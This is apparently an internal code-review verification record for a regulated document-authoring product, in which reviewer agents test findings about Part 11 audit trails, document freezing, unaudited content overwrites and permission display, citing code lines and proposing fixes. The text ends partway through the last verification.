# Verification record — editor family, 2026-09-28

Each blocker, high and medium finding in the lens reports went to a separate agent told to refute it, reading the code itself (`README.md` for the method). Accessibility mediums and each security file group's mediums were verified in groups. Below is each verifier's hand-back as returned. Paths to the verifiers' scratch harnesses, which are not in the repository, are redacted to `<scratch>`.


---

## Verification of P11-A-1
**Verdict:** PARTLY CONFIRMED

**Severity, as you would grade it:** high. The document's own Part 11 trail never records a cite, un-cite or re-read, and the un-cite DELETE and the checksum overwrites destroy the cite-time checksum with no before-image kept in any audit store, so a reviewer can be materially misled about what a section was drafted from. It is not a blocker because in the shipped production setup every one of these requests still leaves a hash-chained, signed row saying who did it, when, and to which endpoint, and each content save copies the section's citation set into the append-only revision ledger. (The document's trail is `authoring_audit_trail`, the only store the Audit rail and `GET /docs/:docId/audit` read.)

**What I checked:** I read the code at HEAD `26fbf978`. Its only difference from `7087f46e2` is `docs/work-orders/README.md`.
- **Client:** `DocumentWorkbench.tsx:1789-1970` (citeSource, uncite, reresolve, refreshAllSources); the call sites at `3915`, `4465`, `4564` and `4619-4623`; the labels at `207-224`; the Audit rail empty state at `4365-4371`.
- **Router:**
  - The four handlers: `authoring.router.ts:2515-2546`, `2549-2571`, `4305-4357` and `4631-4667`.
  - The audit helpers at `640-742`.
  - Router middleware: the JWT check at `112-186` and the section lock/permission guard at `413-452`.
  - `GET /docs/:docId/audit` at `5758-5783`.
  - The contrast sites at `1939-1954`, `2308-2314`, `6228-6237` and `3200-3280`.
- **Service:** `source-usage.service.ts`, all 653 lines.
- **Middleware and boot:**
  - `authoringObjectAuthorization.ts` in full, and its mount order at `register-inline-routes.ts:300-318`.
  - `server/index.ts:108-154`.
  - `server/startup/audit-trail.ts` and `audit-enforcement.ts` in full.
  - `server/lib/tamper-proof-audit.ts:265-500` and `815-832`.
  - `enterprise-security.ts:620-712` (the `[AUDIT]` logger only writes to the console).
  - `server/db/poolInstrumentation.ts:1-260`.
- **Deploy settings:** `terraform/stack/main.tf:156-167`, `.github/workflows/deploy-aws.yml:335-446`, `ci.yml:1820-1862`, and `docs/evidence/W2/2026-09-25-audit-posture-deploy/boot.txt`.
- **Database:**
  - Every `CREATE TRIGGER` in `db/migrations` and `migrations`, both static ones and ones built with `EXECUTE format(...)`.
  - All SQL that mentions `authoring_citations`.
  - `20260813_audit_tamper_proof_log.sql` (append-only grants, no RLS) and `20260817_doc_revisions_immutable_ledger.sql`.
  - `ensureCoreTables.ts`, `scripts/db/authoring-subsystem.mjs`, and `authoring-evidence.ts:194-321`.

**Why:**

What holds:
- **No handler or service function writes to any audit store.**
  - The service imports only `randomUUID`, `pool`, `visibleOrgClause` and a type (`source-usage.service.ts:51-55`).
  - Its writes are:
    - the INSERT (`227`);
    - the re-resolve overwrite `SET payload_sha256 = $1, citation_text = COALESCE($2, citation_text)` (`215-219`);
    - `DELETE FROM authoring_citations … AND frozen_at IS NULL` (`254-256`);
    - `UPDATE authoring_citations SET payload_sha256 = $1 …` (`525`).
  - Each handler goes straight from the service call to its response:
    - `res.status(result.created ? 201 : 200)` (`authoring.router.ts:2535`);
    - `res.json({ success: true, removed: true })` (`2566`);
    - the refresh-token response (`4348-4357`);
    - `res.json({ ok: true, refreshed, changed, skipped })` (`4662`).
  - The word "audit" appears nowhere in those ranges.
- **No middleware or trigger writes one either.**
  - The router middleware (`112-186`, `413-452`) and `authoringObjectAuthorization` only authorize. The latter's only side effect is setting `res.locals.authoringAuthorization` (`:285`).
  - No migration puts a trigger on `authoring_citations`.
  - The generic row-audit triggers name other tables (`054_gcc_part11_audit.sql:451-483`, `064_gcc_cognitive_audit_schema.sql:641-669`).
  - The pool wrapper only counts queries and applies tenant scope.
- **The Audit rail can never show a citation act.**
  - The document's trail is read with `FROM authoring_audit_trail WHERE doc_id = $1 AND tenant_id = $2` (`authoring.router.ts:5764-5774`).
  - That table is written only by `writeAuthoringAuditTrail` (`authoring-evidence.ts:194-249`).
  - This is despite the router's own rule that "§11.10(e) wants every change to a governed record recorded with who, when, and what moved" (`authoring.router.ts:1939-1946`).
  - The value being overwritten or deleted is "the source's checksum AT THE MOMENT IT WAS CITED" (`source-usage.service.ts:21`).

What is refuted:
- **"No audit trail row of any kind … ever" and "no trace" are false in production.**
  - `server/index.ts:134` mounts `applyAuditTrailMiddleware(app, pool, debugLog)` before the auth boundary (`138`) and before every route (`154`).
  - For every POST, PUT, PATCH or DELETE under `/api` it registers `res.on('finish', …)` and calls ``auditLog.log(eventType, `${req.method} ${req.path} → ${res.statusCode}`, { method, path, statusCode, query }, { userId, … })`` (`audit-trail.ts:104-140`).
  - That is a hash-chained, HMAC-signed INSERT, typed `RECORD_CREATED` or `RECORD_DELETED`, into the append-only `audit.tamper_proof_log` (`tamper-proof-audit.ts:382-500`).
  - It only runs when `AUDIT_TRAIL_ENABLED` is set (`audit-trail.ts:94`). Production sets it, together with `AUDIT_REQUIRE_ENFORCE` = `"true"` (`terraform/stack/main.tf:166-167`).
  - The deploy preflight requires both flags (`deploy-aws.yml:380, 438-446`), and a production boot without the trail is refused (`audit-enforcement.ts:95-98`).
  - So in production each cite, un-cite, re-read or refresh-all is recorded with the actor, time and IP, and a path that carries the section or doc id (and, for the DELETE, the source id). The finding holds literally only where the flag is unset, which is dev and test.
- **The revision ledger also keeps a record.**
  - Every content save copies the section's citations into `doc_revisions.inputs` (`SELECT id AS citation_id, source, reference_id, payload_sha256, created_at FROM authoring_citations …`, `authoring-evidence.ts:298-311`).
  - The database refuses UPDATE and DELETE on `doc_revisions` (`20260817_doc_revisions_immutable_ledger.sql:62-65`).
  - A citation that existed at any save stays on record after it is deleted, so "nothing in the system says the citation ever existed" overstates it.

Why it still matters:
- **The interceptor row is thin.**
  - The product itself calls the interceptor "best-effort defense-in-depth" (`SUBMISSION_GRADE_GAP_REGISTER.md:54`). The project routes say it writes to a different store from the audit feed the UI reads (`routes/c2c/projects.ts:340-343, 875-877`).
  - It logs no request body. So it does not record which source was cited, which citation was re-read, the old or new checksum, or the deleted row's `payload_sha256`, `citation_text` or `created_by`.
- **The ledger copy is incidental.** It exists only if a content save happened between the acts, and it names no actor or time for the removal or refresh.
- So the before-image of a destructive change is not reliably kept anywhere, and the document trail never records the act.

Minor errors in the report:
- Reorder's audit write is inside the transaction (`createAuditEvent(…, tenantId, client)`, `authoring.router.ts:6237`), not standalone.
- Accepting an AI draft records span lineage (`enforceSourceAndAuthorLineage`, `3259-3280`), not `authoring_citations` rows.
- `POST /sections/:sectionId/cite` (`2453-2488`) writes no audit row either, so this is not "the one" unaudited action.

**If confirmed, the smallest correct fix,** and where the report's fix is wrong or incomplete:
- **Fix:**
  - In each of the four handlers, write a `createAuditTrail` row in the same transaction as the citation write. The service functions use the global `pool` (`source-usage.service.ts:53`), so they need an executor parameter.
  - Keep the before-image: use `DELETE … RETURNING *`, and read the prior `payload_sha256` and `citation_text` before overwriting them.
  - Store citation id, source id, previous and current checksum, and citation_text as before/after or metadata. Take the doc id from `res.locals.authoringAuthorization.docId` or from a section join.
  - For refresh-all, write one entry per citation whose checksum changed.
  - Add the new labels, and add citations to the Audit rail's empty-state list.
- **Where the report's fix is wrong or incomplete:**
  1. **Its standalone audit write is not enough for the DELETE or the overwrites.** A standalone write runs after the change has committed. Outside production a failure is swallowed; in production it throws only after the fact (`authoring-evidence.ts:237-249`). Either way the before-image is gone for good. The audit write must be in the same transaction, as reorder already does.
  2. **There are four call sites, not three.**
  3. **The refresh-token audit row must take its section and doc from the citation row, not the URL path.**
     - The route never checks that `cite_id` belongs to `:sectionId` (`authoring.router.ts:4307-4310`, `4333`), and the service filters on tenant only (`source-usage.service.ts:502-505`).
     - This is also a separate defect nobody has filed. Anyone who can edit one unlocked section can re-read a citation on another document's section and rewrite its checksum, even when that document is FROZEN or APPROVED. The only lock checked is the citation-level `frozen_at`, and no production code ever sets it.
     - The fix is to add `AND section_id = $3`, and this should be filed as its own finding. It also means the report's P11-A-3 claim that these writes are "fully enforced server-side" is wrong for this route.
  4. A soft delete is optional once the audit row keeps the before-image.

---

## Verification of P11-A-2
**Verdict:** PARTLY CONFIRMED

**Severity, as you would grade it:** medium. A document owner with a live session and one sentence of reason can put a document into a state that the eCTD per-leaf "approved" check accepts, with no re-authentication and no signature on the document. It is not a blocker for two reasons: the sequence-release signature still re-verifies the signer and checks their authority, and no surface I read labels the frozen document "approved" (the IND and NDA views say "locked").

**What I checked:** The working tree is at `26fbf978`, and `git diff 7087f46e2 HEAD` is empty for every file below.
- **Freeze handler and its guards:**
  - `server/routes/authoring.router.ts`:
    - the router-wide middleware (112-186);
    - the two signer checks: `assertSigningAuthority` (593-609) and `reverifyAuthoringSigner` (783-797);
    - freeze, read in full (3708-3921), and e-sign (3924-4123);
    - `/sign` (5566, 5588), revert (2103-2175) and submit (5212-5281);
    - every status write (3860, 4038, 5278, 5398, 5474).
  - The object gate:
    - `server/middleware/authoringObjectAuthorization.ts` (full file);
    - `server/services/authoring/authoring-permissions.ts:67-236`.
  - The creator-becomes-OWNER trigger:
    - `db/migrations/20260727_authoring_object_permissions.sql:183-216`;
    - it deploys via `scripts/db/authoring-subsystem.mjs:68`.
  - Mount order: `server/bootstrap/register-inline-routes.ts:300-317`.
  - Where another guard could have been: I searched `server/middleware`, `server/startup` and `server/bootstrap` for freeze, step-up and re-auth guards and found none. The only client caller of `/freeze` is `AuthoringFilingBar.tsx:173`.
- **Client:** `client/src/concept2cure/v2/surfaces/AuthoringFilingBar.tsx`, full file.
- **Downstream (the chain the report carried forward without reading):**
  - `server/services/coauthor/coauthor-snapshot.ts:95-103, 232-345, 423-520`
  - `server/routes/coauthor.ts:162-230` and `AuthoringPlaceIntoFiling.tsx:247`
  - `server/services/ectd/leaf-source-resolver.ts:121-193, 451`
  - `server/services/ectd/assemble-from-core.ts:100-140`
  - `server/services/ind-lifecycle/ind-checklist-view-assembler.ts:71-104` and `server/services/nda/nda-modules-view-assembler.ts:48-56`
  - `server/routes/submission-sign-release.ts:182, 262`
  - A grep for `authoring_signatures` across the eCTD, coauthor, IND and submission code found nothing.
- **What the product says freeze is for:**
  - `server/services/authoring/document-lock.ts:45-55`
  - `server/services/ana-ri/part11-governance.ts:25-94` and `server/services/ana-ri/command-executor.ts:3345-3390`
  - `server/services/part11/reverify-signer.ts:123-129`
  - `docs/work-orders/README.md:239-243` and `docs/security/REMEDIATION_AND_ENHANCEMENT_PLAN_2026-09-24.md:86`

**Why:**
- **Nothing re-verifies the signer on freeze. Confirmed.**
  - What the handler does:
    - It validates the reason (`authoring.router.ts:3714`).
    - It takes the actor from the JWT (`:3719-3722`).
    - It commits `status = 'FROZEN'` (`:3859-3862`).
    - No line in 3708-3921 calls `assertSigningAuthority` or `reverifyAuthoringSigner`.
  - E-sign calls both (`:3941` `if (!(await assertSigningAuthority(req, res))) return;` and `:3963` `const signer = await reverifyAuthoringSigner(req, res);`), and so does `/sign` (`:5566`, `:5588`).
  - The only things in front of freeze:
    - JWT verification plus a live membership check (`:112-186`).
    - The object gate, which classes freeze as `'approve'` (`authoringObjectAuthorization.ts:35`).
    - `'approve'` is granted to OWNER and APPROVER (`authoring-permissions.ts:80,83`), and every creator is seeded as OWNER (`20260727_…sql:213-214`).
  - The dialog posts only `reason`, `version` and `acknowledgeUnresolved` (`AuthoringFilingBar.tsx:173-179`).
- **Freeze is designed as a non-signature act, and this is where the report overreaches.**
  - The router's own comment puts signing after freeze: "Freeze is the seal: after it the content is seseal-hashed [sic], signed under §11.50 and filed" (`authoring.router.ts:3754`).
  - The dialog text says the snapshot is taken "before signing or filing" (`AuthoringFilingBar.tsx:93`).
  - Both view assemblers state "freezing needs no signature" (`ind-checklist-view-assembler.ts:74`, `nda-modules-view-assembler.ts:51`).
  - §11.200 governs executing an electronic signature. Freeze writes no signature row, and the §11.10(g) authority check is present (the OWNER/APPROVER gate). So the missing re-authentication, taken alone, is not the "§11.200 distinction" the report calls it.
  - AnA's policy does put `freeze_document` in the e-signature tier (`part11-governance.ts:81,90`). That tier governs actions the model proposes, not the direct UI:
    - Direct-UI revert is in the same tier and also has no re-authentication (`authoring.router.ts:2103-2175`).
    - AnA's own freeze refuses and sends the person to "the document panel where the reason is captured" (`command-executor.ts:3376`).
- **Downstream treats an unsigned FROZEN document as approved and complete. Confirmed, and this is what makes it a real defect.**
  - Placing a FROZEN document files it as `'finalized'` (`AuthoringPlaceIntoFiling.tsx:247` → `coauthor.ts:212` → `coauthor-snapshot.ts:103` `state === 'FROZEN' ? 'finalized'`). That needs only an unchanged state, some saved text and a matching seal (`:312-345`). No signature is required.
  - `FINALIZED_SOURCE_STATUSES = new Set(['approved', 'finalized'])` (`leaf-source-resolver.ts:140`, applied at `:451`), so the document is never counted as unfinalized.
  - The product defines an unfinalized leaf as one where "the agency would receive a document no one approved" (`assemble-from-core.ts:103`). Its only warning for that is "leaf document(s) are not approved" (`:133`), and a never-approved frozen document does not trigger it.
  - The IND and NDA views count it as COMPLETE (`ind-checklist-view-assembler.ts:79,104`), but label it "locked".
  - No downstream check reads `authoring_signatures`.
  - What limits the damage: the release step still calls `isSigningAuthorized` and `reverifySigner` (`submission-sign-release.ts:182,262`).
  - This is already an open founder decision (`docs/work-orders/README.md:239-243`; plan row P1-32).
- **Small inaccuracies in the report:**
  - The freeze dialog asks for a reason, a version label and (after a refusal) an acknowledgement, not only a reason.
  - The assembler comment "any org member may freeze" is itself wrong; only OWNER or APPROVER can freeze.

**If confirmed, the smallest correct fix:**
- **Fix it where approval is claimed:** in the eCTD leaf check, stop counting a coauthor copy of an unsigned freeze as approved. Either:
  - drop `'finalized'` from the `coauthor_documents` set (`leaf-source-resolver.ts:140,184`), or
  - accept `'finalized'` only when an APPROVER row in `authoring_signatures` covers the copy's recorded `sealVersion` (`covered_freeze_version`).

  Either way, "not approved" is then reported for a document no one approved. Keep the IND and NDA "locked" label; whether it counts as COMPLETE is the founder decision already recorded.
- **The report's option (a), adding `reverifyAuthoringSigner` to freeze, is incomplete on its own:**
  1. A re-authenticated freeze still writes no §11.50 signature or meaning, so the leaf check would still pass a never-approved document as approved.
  2. It is a server-only change. `FREEZE_FORM` (`AuthoringFilingBar.tsx:86-112`) has no password or MFA field, so every UI freeze would get 400 `PASSWORD_REQUIRED` (`reverify-signer.ts:123-129`). A wrong password returns 401, which `:186` would misreport as "your session isn't authenticated."

  If option (a) is taken, it needs:
  - `assertSigningAuthority` run first, as e-sign does;
  - credential capture in the dialog, like `EsignModal`;
  - a 401 branch that says the credential was refused.

  Also, plan P1-32's acceptance criterion "freeze without credentials → 428" does not match the shared re-verification, which answers 400.

---

## Verification of P11-B-1
**Verdict:** PARTLY CONFIRMED. The defect is real: no reason for change, no audit entry for the record, and the replaced text is kept nowhere. One claim is wrong. The report says "no audit middleware wraps it" and "no audit-trail row at all". In production a global request observer does write a hash-chained row for this PUT, but that row cannot serve as the document's audit trail.

**Severity, as you would grade it:** blocker. The body of an eCTD co-author document is overwritten with no reason, no audit entry for the record and no copy of the text it replaces. The UI calls it "a governed document" (`EctdCoauthor.tsx:906`), and the leaf resolver builds it into compiled packages (`leaf-source-resolver.ts:413-454`). That is a regulated record changed, and its prior content lost, without the §11.10(e) control the product claims.

**What I checked:** At HEAD 26fbf978; `git diff 7087f46e2 HEAD` is empty for every file below.
- **Client**
  - `EctdCoauthor.tsx:357-378`: the save path. `:945-963`: the editor mount, with no reason UI anywhere in the file.
  - `RichSectionEditor.tsx:185-194`: the `onSave` contract. `:1134-1175`: `doSave`.
  - `dataConnect.tsx:299-318` (`liveMutateOrNull`) and `queryClient.ts:362-420` (`apiRequest`): no reason header, no audit call.
  - A repo-wide grep shows `EctdCoauthor.tsx:362` is the only client caller of this PUT.
- **Route and service**
  - `coauthor.ts:285-346` (the PUT) and `:348-393` (the DELETE, for contrast).
  - `coauthor-status-write.ts` and `coauthor-audit.ts`, in full.
  - Every caller of `applyCoauthorDocumentPut` and `recordCoauthorDocumentEvent`, including `ectd-documents.ts:229-320`.
- **Mounts and middleware**
  - `register-document-routes.ts:95-116` and `mount-routes.ts:60-84`: the mount adds only `authenticateToken`.
  - `server/auth.ts:186ff` and `middleware/auth.ts:141-297`: no audit write.
  - `authBoundary.ts`: authentication only.
  - `startup/middleware.ts`: read in full.
  - `enterprise-security.ts:668-718` (`auditLog`): a `console.log` only.
  - `betaFlowTelemetry`: in-memory counters only.
  - `server/index.ts:130-154` with `startup/audit-trail.ts` in full, and `lib/tamper-proof-audit.ts:382-500`: this is the observer the report missed.
  - `terraform/stack/main.tf:156-167` and `deploy-aws.yml:376-445`: production turns that observer on.
- **Database**
  - All `.sql` files under `migrations/` and `db/`: the only trigger on `coauthor_documents` is the generic `set_updated_at` (`db/migrations/20260526_updated_at_triggers.sql`).
  - Writers of `coauthor_document_versions`: only `batch-draft-routes.ts:475`.
  - `db/runtime.ts:116`: a plain `drizzle(pool)` with no hooks.
- **Two experiments in the scratchpad**, using the repo's Express 5.2.1 and the real mount shape:
  - The observer's row reads `"PUT /documents/5 -> 200"` with `resourceType:"5"`. The `/api/coauthor` prefix is dropped.
  - The tenant scope does reach its `finish` listener, so the row is written.

**Why:**
- **No reason, end to end.**
  - The client sends content only: `EctdCoauthor.tsx:363` `{ content: serialized },`.
  - The editor leaves the author's reason to the host: `RichSectionEditor.tsx:186-187` "The host requires the author to state a reason for their own edits". `systemReason` exists only for comment anchors, and this host does not enable comments. So the real gap is that the host never collects a reason, not that it drops `systemReason`.
  - The server reads no reason: `coauthor.ts:297` `const { title, content, status } = req.body || {};`.
- **No audit entry for the record.**
  - The only write is `coauthor-status-write.ts:301` `const [document] = await tx.update(coauthorDocuments).set(set).where(scope).returning();`. Its transaction (`:276-303`) makes no audit call.
  - The one audit writer is closed to two events: `coauthor-audit.ts:47` `eventType: 'coauthor_document.deleted' | 'coauthor_document.retaken';`. It is called only from `coauthor.ts:376`, `ectd-documents.ts:354` and `coauthor-snapshot.ts:461`.
  - The codebase says so itself, at `batch-draft-routes.ts:334-335`: "WHY NOT `PUT /api/coauthor/documents/:id`. That route accepts content, but it neither snapshots the content it replaces nor records who replaced it." That sibling route does both: a version row at `:475` and an `audit_events` row at `:530`, in the same transaction.
- **The prior text is lost.** Nothing on this path writes `coauthor_document_versions`, and no trigger or wrapper does either. This fails §11.10(e)'s "shall not obscure previously recorded information".
- **Where the report is wrong.** `audit-trail.ts:104-140` is mounted on `/api` (`server/index.ts:134`) before any route is registered (`:154`). Production sets `terraform/stack/main.tf:166` `{ name = "AUDIT_TRAIL_ENABLED", value = "true" }`, so a `RECORD_UPDATED` row lands in `audit.tamper_proof_log` for this PUT. That row still is not an audit trail for the document:
  - It is not tied to the write: `:109` "Fire-and-forget. We never want audit logging to block a response". A failed write only reaches stderr, and the edit stands.
  - It records only `` `${req.method} ${req.path} → ${res.statusCode}` `` (`:119`).
  - Because the path is relative to the mount, it reads `PUT /documents/5 → 200`: no resource id, no organization, no reason, no before or after text.
  - In dev and CI the flag is unset, so nothing is written at all.
  - `enterprise-security.ts:713` `console.log('[AUDIT]', …)` is only a stdout line.
- **The report's point about permissions holds.** The only checks are authentication (`coauthor.ts:285`, the mount, `authBoundary`). There is no per-document grant.

**If confirmed, the smallest correct fix:**
1. Put the fix in the shared writer so both PUT routes get it. Extend `applyCoauthorDocumentPut` with `actor` and `reason`. Inside its existing FOR UPDATE transaction, whenever `set` changes content, title, module or status:
   - (a) insert the replaced `content` into `coauthor_document_versions`, following `batch-draft-routes.ts:470-485`;
   - (b) call `recordCoauthorDocumentEvent(queryableFromDrizzle(tx), …)`, following `coauthor-snapshot.ts:450-470`. Use a new `'coauthor_document.updated'` event carrying the reason, SHA-256 hashes of the before and after text, and the superseded version number.
2. In both `coauthor.ts` and `ectd-documents.ts`, require `requireGovernedReason(req.body?.changeReason)` (`server/routes/governed-reason.ts:30`) and return 400 before any write. Pass `coauthorAuditActor(req)` as the actor.
3. In `EctdCoauthor.tsx`, collect the author's reason before Save and send `{ content, changeReason }`.

Where the report's own fix is incomplete:
- It records an event but keeps no copy of the replaced text. A reason plus an event does not satisfy "shall not obscure".
- It triggers only when `governedSet` is non-empty, so a status-only PUT stays unaudited. That PUT is allowed by `coauthor-status-write.ts:51-52` and can withdraw an `approved` filing copy to `draft`.
- It fixes only the coauthor route, while `ectd-documents.ts` shares the same writer.

Also worth adding: `coauthor-status-write.ts` is invisible to `scripts/ci/check-lineage-save-gate.mjs`. Its `.set(set)` call does not match the gate's content-write regexes (I tested this), which is why no CI gate flagged this writer. It should be listed in the gate.

---

## Verification of P11-B-2
**Verdict:** CONFIRMED

**Severity, as you would grade it:** medium. The grant is enforced on the server in every environment and fails closed. The refusal at Save gives the reason and says nothing was saved, and the typed text stays both on the canvas and in the device cache. So no governed content or record state is shown wrongly, changed or lost. What the UI gets wrong is the person's own authority to edit, and that costs them work up to their first Save. The trigger is broad: it hits every member who did not create the document, holds no OWNER/AUTHOR grant and is not a global admin. That is a real defect with a workaround, but it does not mislead anyone about governed content or its state.

**What I checked:** (code files at HEAD 185bbbb0; only docs changed since 7087f46e2)
- **Client, `DocumentWorkbench.tsx`:**
  - Props :532-566 and row types `AuthDoc` :115-123, `AuthSection` :139-152 — no permission field anywhere.
  - `docSealed` :869-871.
  - Reason input and header Save :3301-3327.
  - Draft with AnA :3328-3338 and the AI-draft toggle :3346-3370.
  - Rename and reorder :3602-3625; AI panel :3762.
  - The editor mount :3785-3927 (`showSaveButton={false}` :3832, `readOnly={docSealed}` :3834).
  - Revert :4282; `useAuth` :697 and :3853-3854.
  - Save path :1976-2129.
- **Client, other hosts and editor:**
  - `DocumentAuthoring.tsx:70-110` and `DocumentCanvas.tsx`, the two hosts.
  - `RichSectionEditor.tsx`: :874, :1022-1026, :1082-1175, :1886, :2689-2693, :318-323.
  - `queryClient.ts:205-227` and :398-419.
- **Client, repo-wide greps:**
  - No call to `/api/authoring/docs/:id/permissions`.
  - No `canEdit|myRole|effectiveRole|matchedRoles|doc_permissions`.
  - No branch on 403 or `AUTHORING_OBJECT_FORBIDDEN` that would switch the editor to read-only.
- **Server, gates and mounts:**
  - `register-inline-routes.ts:310-317` (mount order).
  - `authoringObjectAuthorization.ts` (full file).
  - `authoring.router.ts:240-246`, :299-378, :413-463.
  - `authoring-permissions.ts` (service, full) and `routes/authoring-permissions.ts` (full).
  - `authBoundary.ts:148-221`, which fills in `req.user` before the gateway runs.
- **Server, read endpoints:** GET `/docs` :1271-1396, `/docs/:docId` :1498-1542, `/docs/:docId/sections` :1545-1604, and `/docs/:docId/workflow`.
- **Server, who gets grants:** the creator seed trigger `db/migrations/20260727_authoring_object_permissions.sql:183-259`, `authoring-documents.ts:395-424`, and every caller of `grantAuthoringPermission`.
- **Collab path:** `hocuspocus-server.ts:189-306`, `collab-authorization.ts:94-137`, `featureFlags.ts:67-81`.
- **Test:** `authoringObjectAuthorization.test.ts:141-157`.

**Why:**
1. **The client never learns the grant.**
   - The only inputs to editability are `docSealed = … ['FROZEN','APPROVED'].includes(…)` (DocumentWorkbench.tsx:869-870) and `readOnly={docSealed}` (:3834).
   - The editor takes that at `editable: !readOnly && boot.mode === 'rich'` (RichSectionEditor.tsx:874). The ribbon is drawn at `{full && boot.mode === 'rich' && !readOnly && (` (:1886).
   - Save is `disabled={!dirty || saving || docSealed || changeReason.trim().length < 8}` (DocumentWorkbench.tsx:3316). Draft with AnA and Revert are `disabled={docSealed}` (:3332, :4282).
   - None of the read endpoints returns a permission. GET `/docs` lists every tenant document (`WHERE d.tenant_id = $1`, authoring.router.ts:1314) with no grant filter and no permission field, and `/docs/:docId` and `/docs/:docId/sections` add none. `decideAuthoringPermission` is called only inside `canEditSection` (:361).
   - The one list endpoint, GET `/authoring/docs/:docId/permissions`, needs `manage_permissions` (routes/authoring-permissions.ts:123-126, :47-52), and no client code calls it.
2. **The server enforces the grant, more widely than the report says.**
   - The first gate is the gateway middleware mounted before the router (`app.use('/api', authoringObjectAuthorization)`, register-inline-routes.ts:311, then `/api/authoring` at :317). It is "deliberately not feature-flagged" (authoringObjectAuthorization.ts:212).
   - A PATCH to `/sections/:id` resolves to `edit` (:133-140), and a denial answers `403 { error: { code: 'AUTHORING_OBJECT_FORBIDDEN', message: 'You do not have permission to perform this action on the authoring object.' } }` (:277-282).
   - The router's `if (process.env.NODE_ENV === 'production') return true;` (:241) and `'No edit permission for this section'` (:453), which the report quotes, are only the backstop.
   - Only `OWNER` and `AUTHOR` carry `edit` (authoring-permissions.ts:80-84). Global admins pass (:67, :199-201).
   - Only the creator is seeded (migration :209-216; authoring-documents.ts:403-417). No other code issues a grant apart from the owner/admin route, which has no client caller. So every other member hits this.
3. **Typed content is kept.**
   - Every keystroke goes to the device cache via `cacheDraft(serialized)` (RichSectionEditor.tsx:973), stored as `dc::<sectionId>` (DocumentWorkbench.tsx:3836).
   - `localStorage.removeItem` runs only after a successful save (RichSectionEditor.tsx:1161-1167). On failure the catch only calls `setSaveState('error')` (:1169-1173), and the footer shows 'Save failed — kept on this device' (:322).
   - The host shows the server's own sentence: "Couldn’t save ${code} — ${why} Nothing was persisted." (DocumentWorkbench.tsx:2117-2122). `apiRequest` throws on a 403 with the nested `error.message` (queryClient.ts:398-406, :215).
   - The refusal therefore comes after the author has typed the content and a reason of at least 8 characters and pressed Save.
4. **Corrections to the report:**
   - Save is not on the ribbon. The editor's own Save sits in its footer (:2689) and is turned off here (`showSaveButton={false}`, :3832); the Save the author can press is the header button (:3312-3327).
   - Enforcement is not only a production default. The gateway gate applies in every environment.
   - Nothing switches the canvas to read-only after a 403, so the author can repeat the refused save.

**If confirmed, the smallest correct fix:**
1. **Server:** return per-caller capabilities computed by the same `decideAuthoringPermission` rules the gates use. Grants can be scoped to one section (authoring-permissions.ts:203-208), so the flag must be per section on GET `/docs/:docId/sections` (`can_edit`, `can_comment`), plus a document-level value on GET `/docs/:docId`. Compute them with one grants query per document, not N calls. The repo already does this in `ReviewThreads.tsx:47-54,124-132`, where the server returns permissions from the enforcing function and the client fails closed.
2. **Client:** set `readOnly={docSealed || activeSection?.can_edit !== true}`, so it fails closed while the value is unknown.
3. **Where the report's fix is incomplete:**
   - Every other write control is gated on `docSealed` alone and must also check the grant:
     - Draft with AnA (:3332) and the AI panel (:3762);
     - Rename and reorder (:3602-3625);
     - Revert (:4282);
     - the project-files cite (:4664);
     - the track-changes and comment controls passed into the editor.
   - The banner or tooltip should name who can grant access (the document owner or an admin), because the product has no UI for granting.
   - After a 403 `AUTHORING_OBJECT_FORBIDDEN`, switch to read-only while keeping the device cache.
   - Changing the flag on GET `/docs` alone does not reach section-scoped grants.
4. **Next to this finding, not part of the verdict:** the live co-editing socket checks only tenant membership and that the document belongs to the tenant (`collab-authorization.ts:99-105`), not grants. It is off by default (`featureFlags.ts:79-80`; `hocuspocus-server.ts:88-90`). If it is ever turned on, a client-side `readOnly` is not enough: the socket must set `connectionConfig.readOnly` for callers who lack `edit`.

---

## Verification of P11-B-3
**Verdict:** CONFIRMED

**Severity, as you would grade it:** medium. Every approved or finalized document placed into a filing opens here in a live editor, with a Save control and "keep drafting" copy. The write is still refused server-side (409, decided on the row held FOR UPDATE) and nothing is written. The refusal is shown in the server's own words, the typed text stays on the device, and the status is printed as text before any edit. So this is an action that is shown and then refused, not a control failure or a false governed state.

**What I checked:**
- `client/src/concept2cure/v2/surfaces/EctdCoauthor.tsx` 1–1055, in full:
  - the mount (945–963), `saveContent` (357–378), and the one-time list read (266–292);
  - where the status is shown (659, 669–673, 912–923), `statusToken` (149–155), and AnA's dirty-buffer guards (445–452, 471–478);
  - a grep for read-only, lock, `inert`, disabled or wrapper gating around the canvas: none.
- `client/src/concept2cure/v2/editor/RichSectionEditor.tsx`: props (177–313), defaults (450–472), `editable` (874), the setEditable effect (1003–1026), device cache and restore (1081–1131, 1871–1880), `doSave` (1133–1175), beforeunload (1191–1202), ⌘S (1480–1491), ribbon (1886), source textarea (2553–2578), "Draft with AnA" (2581–2591), footer Save (2689–2693). There is no `useContext`, so only the prop can make it read-only.
- Could anything else guard it?
  - `surfaceViews.ts` 218–261, 305, 468: the wrapper is a bare `Suspense`.
  - `styles/ectd-v2.css`: no status-keyed `pointer-events` rule, and the surface sets no status attribute to key one on.
- Server:
  - `server/routes/coauthor.ts` 90–129 (the list read has no status filter) and 285–346 (the PUT).
  - `server/services/coauthor/coauthor-status-write.ts` 1–304, in full.
  - `server/services/ectd/leaf-source-resolver.ts` 140 and 183–194.
  - `server/routes/ectd-documents.ts` 239–286.
- Whether verdict rows really occur:
  - `server/services/coauthor/coauthor-snapshot.ts` 97–103
  - `client/src/concept2cure/v2/surfaces/AuthoringPlaceIntoFiling.tsx` 247–261
  - `server/services/cmc/place-module3-into-submission.ts` 210–215
- The sibling host that does gate: `client/src/concept2cure/v2/editor/DocumentWorkbench.tsx` 869–871, 3747–3754, 3834.
- `client/src/concept2cure/v2/__tests__/ectdCoauthorFinalizedRefusal.test.tsx` 1–133, read and run at HEAD with `vitest run --no-cache`: 1 passed.
- TipTap 3.31.3 source: `node_modules/@tiptap/core/src/commands/setContent.ts` and `Editor.ts` 746–759.
- Commit: the review is at `7087f46e2`. HEAD moved to `10ad41a2` during my check (a commit from another session). `git diff 7087f46e2 HEAD` over every file above is empty. I modified no repository file.

**Why:**
1. **The mount never sets `readOnly`.** EctdCoauthor.tsx:945–963 passes `key`, `ref`, `value`, `format="html"`, `onSave={saveContent}`, `onDirtyChange`, `autosaveMs={null}`, `storageKey`, `ariaLabel`, `placeholder` and `onAsk`, and nothing else. The prop defaults off (RichSectionEditor.tsx:458 `readOnly = false,`), and every editing affordance keys on it alone:
   - :874 `editable: !readOnly && boot.mode === 'rich',` (and :1024 on later renders);
